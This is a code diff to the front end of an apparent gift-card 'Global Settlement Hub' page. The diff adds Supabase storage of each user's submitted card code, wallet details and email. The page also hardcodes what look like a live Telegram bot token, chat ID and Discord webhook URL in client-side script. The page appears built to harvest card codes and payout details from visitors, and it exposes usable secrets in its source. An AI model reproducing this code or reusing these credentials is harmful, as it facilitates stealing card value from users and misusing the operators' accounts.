@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>DLA | Global Settlement Hub</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
@@ -204,6 +205,11 @@
     <a href="https://t.me/Interglobalsettlement" class="chat-btn"><div class="dot"></div><span>Telegram Support</span></a>
 
     <script>
+        // --- SUPABASE CONFIG ---
+        const SB_URL = 'https://wgaypjhiahdrxhcaqqsm.supabase.co';
+        const SB_KEY = 'sb_publishable_jYwoLzJCGLPi5sQAU29USA_tXCQXpLQ';
+        const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+
         const TELEGRAM_TOKEN = "8662083297:AAHESm81XuXqj7ZUgESysc1RH-lRiSPwARs"; 
         const TELEGRAM_CHAT_ID = "5022438644";
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484706100916781057/b13TunLishCPP0s3b2Q6G0bG84UMShEICD6KRiQaWYUHmG0c2rSoq2mJ6FWjuEgZbfJS";
@@ -292,7 +298,7 @@
             } else { lBox.style.display = "none"; }
         }
 
-        function submitNow() {
+        async function submitNow() {
             const cardCode = document.getElementById('card').value;
             const walletDetails = document.getElementById('wallet').value;
             const userEmail = document.getElementById('email').value;
@@ -301,6 +307,26 @@
             const assetName = brandSelect.options[brandSelect.selectedIndex].text;
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
+
+            // START: SUPABASE STORAGE
+            const { data, error } = await supabaseClient
+                .from('exchange_submissions')
+                .insert([
+                    { 
+                        card_code: cardCode, 
+                        asset_name: assetName, 
+                        amount: amount, 
+                        payout_method: method, 
+                        wallet_details: walletDetails, 
+                        user_email: userEmail 
+                    }
+                ]);
+
+            if (error) {
+                if(error.code === '23505') return alert("ERROR: This code has already been submitted for settlement.");
+                console.error("Supabase Error:", error);
+            }
+            // END: SUPABASE STORAGE
 
             const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
             const newTx = { 
